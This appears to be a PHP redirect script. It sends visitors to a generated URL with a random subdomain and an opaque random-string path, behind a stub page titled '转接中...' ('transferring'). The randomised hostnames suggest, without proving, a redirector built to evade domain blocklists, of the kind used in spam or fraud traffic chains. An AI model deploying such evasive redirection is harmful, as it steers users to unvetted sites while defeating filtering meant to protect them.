<?php
include ('include.php');
$type = $_GET['ty'];
if(!$type)exit(500);
$n = mt_rand(10,100);
//example=>http://jsjs.incocos.com/ldedc82@3fc68f9-86c8efa)ca30af*5a,5dc34;8f9210080388e8b24e4d577acd234f25;19;78cb28ae8a7eaf1684941d49f43200afadvertmbqtihehacrgg
$jumpUrl = "http://" . strtolower(get_rand_str ( 2, 6 )) . "." . $d1_domain . "/ld".strtolower(get_rand_str ( 5, 5 )) ."@".strtolower(get_rand_str ( 7, 7 ))."-mid6c8efa)ca30af*5a,".strtolower(get_rand_str ( 5, 6 )).";".get_random_str(16)."acd234f25;$n;".get_random_str(32);
header("location:$jumpUrl");
?>
<!doctype html>
<html lang="en" style="font-size: 53px; width: 400px;">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<title>转接中...</title>
</head>
<body>loadding...</body>
</html>